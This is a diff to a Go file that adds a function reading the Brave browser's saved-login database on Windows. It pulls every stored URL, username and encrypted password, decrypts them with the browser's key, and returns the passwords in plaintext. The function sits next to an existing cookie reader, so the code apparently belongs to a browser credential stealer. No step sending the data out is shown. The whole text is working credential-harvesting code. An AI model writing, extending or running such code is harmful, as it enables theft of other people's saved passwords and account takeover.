@@ -67,6 +67,50 @@ func ReadBraveCookies() ([]Cookie, error) {
 	return cookies, nil
 }
 
+func ReadBravePasswords() ([]Password, error) {
+	osUser, err := utils.GetCurrentUsername()
+	if err != nil {
+		return nil, err
+	}
+	passwordsPath := fmt.Sprintf("C:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", osUser)
+
+	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", passwordsPath))
+	if err != nil {
+		return nil, err
+	}
+	defer dbConn.Close()
+
+	err = getAesGCMKeyBrave()
+	if err != nil {
+		return nil, err
+	}
+	rows, err := dbConn.Query(`SELECT origin_url as URL, username_value as Username, password_value as Password FROM logins;`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var passwords []Password
+
+	for rows.Next() {
+		var password Password
+
+		err = rows.Scan(&password.URL, &password.Username, &password.PasswordEncrypted)
+		if err != nil {
+			return nil, fmt.Errorf("error scanning row: %w", err)
+		}
+		decrypted, err := decryptValue(password.PasswordEncrypted)
+		if err != nil {
+			return nil, err
+		}
+		fmt.Println(password)
+		password.PasswordDecrypted = string(decrypted)
+		password.PasswordEncrypted = nil
+		passwords = append(passwords, password)
+	}
+	return passwords, nil
+}
+
 func getAesGCMKeyBrave() error {
 	path, err := os.UserCacheDir()
 	if err != nil {
